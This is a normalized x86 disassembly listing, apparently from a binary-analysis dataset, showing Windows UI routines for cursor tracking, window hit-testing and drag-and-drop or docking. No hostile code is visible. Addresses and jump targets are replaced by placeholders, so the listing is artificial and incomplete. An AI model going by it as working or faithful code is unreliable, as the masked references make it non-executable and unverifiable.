sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43ee2c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43e7b4
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd4
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43e7b4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43ee2c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43e7b4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43ee2c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43dddb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43ee2c
sub_43de34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43de5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43dec4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dc70
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43def0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403418
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43df1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403418
xor edx edx
sub_43df74
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448cc8
sub_43df94
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448cb0
sub_43dfb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43dea0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4234dc
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a234
mov edx eax
mov eax esi
call sub_423658
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43e01c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_43e04c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dec4
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43e0a8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403418
pop edi
pop esi
pop ebp
retn 0x4
sub_43e0cc
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43e0f0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43e0cc
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43e0cc
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43e1ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43e218
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43e668
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43d784
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4470c4
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4470c4
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4470c4
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403418
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43e1ac
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4470c4
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4470c4
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43e3b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4470c4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4470c4
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43e3f4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43dc0c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43e218
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_41a19c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4470c4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43e3b0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403418
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_445bbc
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43db7c
sub_43e550
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41a1f8
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41a08c
mov edx edi
mov eax [ rw-data ]
call sub_41a040
jmp r-xdata
sub_43e5b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43e608
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43d750
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43e668
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43e608
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43e694
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43e3f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43e668
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43e5b0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4470c4
mov [ esi ] eax
sub_43e6e4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43e5b0
cmp eax 0x1
sbb eax eax
inc eax
sub_43e720
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_445b28
test eax eax
je r-xdata
mov eax esi
call sub_445b28
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43f150
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_41a19c
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a1f8
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_445b3c
mov edi eax
jmp r-xdata
sub_43e7b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43e694
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_448b84
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43e6e4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43e6e4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4403e8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43e6e4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_448b6c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43e720
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403418
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_448c6c
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_448b84
jmp r-xdata
mov eax [ rw-data ]
call sub_448ce0
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e3e4
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4403e8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403418
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403418
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407f98
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43ea84
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43dcb0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_448b84
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43e7b4
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43ebf4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43ed99
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403418
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403418
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dfb8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43ea84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dea0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_4470c4
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_418d40
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_4403bc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_418d40
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43edb8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403418
mov ebx eax
sub_43ee2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43f0f8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43f086
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
